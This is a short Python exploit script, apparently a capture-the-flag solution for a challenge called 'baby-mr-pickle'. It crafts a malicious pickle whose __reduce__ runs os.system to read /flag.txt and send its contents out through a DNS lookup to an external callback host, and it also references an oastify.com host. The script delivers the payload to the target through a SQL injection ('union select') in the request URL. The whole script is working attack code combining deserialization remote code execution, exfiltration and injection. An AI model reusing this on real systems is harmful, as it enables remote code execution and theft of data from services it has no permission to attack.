#!/usr/bin/python3
import pickle, os, base64, requests
def pickle_loads(s):
    return pickle.loads(base64.b64decode(s))
# Exploit that we want the target to unpickle

class Exploit(object):
    def __reduce__(self):
        return (os.system,('nslookup $(cat /flag.txt).iyyrto6p.requestrepo.com', ))
      #ping 2cfhrsub9xxvy5ktz677g0r2ctij68.oastify.com
      

shellcode = base64.b64encode(pickle.dumps(Exploit())).decode()
print(shellcode)
print("pickle:", base64.b64decode(shellcode), flush=True)
# print(pickle_loads(shellcode))

URL = "https://baby-mr-pickle-43ac5b75.dailycookie.cloud/view/3' union select '"
r = requests.get(URL + shellcode, verify=False)
if (r.status_code == 200):
    print(r.text)
